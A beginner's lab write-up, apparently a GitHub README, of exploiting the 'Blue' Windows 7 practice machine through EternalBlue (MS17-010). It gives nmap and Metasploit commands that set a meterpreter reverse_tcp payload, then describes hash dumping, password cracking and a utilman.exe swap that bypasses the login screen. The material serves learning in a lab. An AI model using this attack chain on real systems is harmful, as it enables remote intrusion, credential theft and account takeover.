![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/logo.png)

# Blue

This is the Fifth Box i tired.

Let's start with finding the `ip address` of `Blue`

## Scanning

You can use `netdiscover` to find the ip address of the `Blue' Machine :

```
netdiscover -r [yourip]/24

Check for the one with Vritual Machine names on it
```
Now let's do an `nmap` scan.

```
nmap -p- -A -T4 [Target IP]

```
Results:


![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/nmap.png)

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/nmap2.png)

We found these ports open:


- `135/tcp   open  msrpc        Microsoft Windows RPC`
- `139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn`
- `445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)`

Now after searching for this in google i found `eternal blue exploit` from [**Rapid7**](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)


![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/ms17-010.png)

And this is how you can use it :

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/msexploit.png)

You can check for `eternalblue` exploits using tools like **Searchsploit**

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/searchsploit%20eter.png)

Now what is that :

```
Eternal Blue is an exploit that targets a vulnerability in the Windows implementation of the Server Message Block (SMB) protocol. SMB is a network file-sharing protocol that allows users to access files and printers on a local network.

The vulnerability, known as CVE-2017-0144, exists in the way Windows handles SMBv1 requests. Specifically, it affects the way Windows processes specially crafted SMBv1 packets that contain malicious code.

Here's a step-by-step breakdown of the exploit:

1. Initial Compromise: An attacker sends a specially crafted SMBv1 packet to a vulnerable Windows machine.
2. Buffer Overflow: The packet causes a buffer overflow in the Windows SMBv1 implementation, allowing the attacker to execute malicious code.
3. Shellcode Execution: The malicious code, known as shellcode, is executed in the context of the Windows kernel.
4. Kernel Mode Access: The shellcode gains access to the Windows kernel mode, allowing it to execute arbitrary code with elevated privileges.
5. Payload Delivery: The shellcode delivers a payload, such as malware or a backdoor, to the compromised machine.
6. Propagation: The malware can spread to other vulnerable machines on the network via SMB, creating a worm-like effect.
```
This is a manual way of exploiting this box using this [**Tool**](https://github.com/3ndG4me/AutoBlue-MS17-010).

But let's check if it's acutally vulnerable or not.

we can do that using this module :

`auxiliary/scanner/smb/smb_ms17_010`
```
$ msfconsole

$ msf5 > search eternalblue

$ msf5 > use 1

$ msf5 auxiliary(scanner/smb/smb_ms17_010) > options

$ msf5 auxiliary(scanner/smb/smb_ms17_010) >  set rhosts [blue ip]

$ msf5 auxiliary(scanner/smb/smb_ms17_010) > run

[it will check if the target machine is vulnerable to any smb - MS17-010]
```
![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/msfchecksmb.png)

Yep, it is vulnerable to `ms17_010_eternalblue`

You can also check it by [**this**](https://github.com/3ndG4me/AutoBlue-MS17-010) script

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/etrnalbluchecker.png)

It say's `Target is not patched` so it's vulnerable.

## Exploitation

Now let's run `msfconsole`.

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/use%20exploit%20smb.png)

```
$ msf5 exploit(windows/smb/ms17 010 eternalblue) > options

$ msf5 exploit(windows/smb/ms17 010 eternalblue) > set rhosts [blue ip]

$ msf5 exploit(windows/smb/ms17 010 eternalblue) > set payload windows/x64/meterpreter/reverse_tcp

$ msf5 exploit(windows/smb/ms17 010 eternalblue) > set lhost [your ip]

$ msf5 exploit(windows/smb/ms17 010 eternalblue) > run

```
![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/meterpretershell.png)

- We can dump the hashes using `hashdump` :

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/hashdump.png)

- Take a screenshot :

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/screenshot.png)


![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/Blue.png)

- Getting `shell` :

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/authsystem.png)

Cracked the password :

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/password%20crack.png)

We can also crash this machine by doing like this 

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/crash.png)

```
(I need to learn more about these things !)
```
I also tried a simple trick in where you can rename the `utilman.exe` to `utilman2.exe` & 
`cmd.exe` to `utilman.exe` present in the `system32` folder.

(Found this one [**Loi Liang Yang**](https://youtu.be/2v-mGf4_9-A?feature=shared) channel)

This give you access to `cmd prompt` from the `user login window` and you can easily change user's password using :
```
net user [username][password]
```

![alt text](https://github.com/jissjames322/Beginner-Level-Machines/blob/49ded029b6c2f3238d85e40ace2076e37c81776b/Blue/images/utilman.png)


```
5 Down 1 to go
```








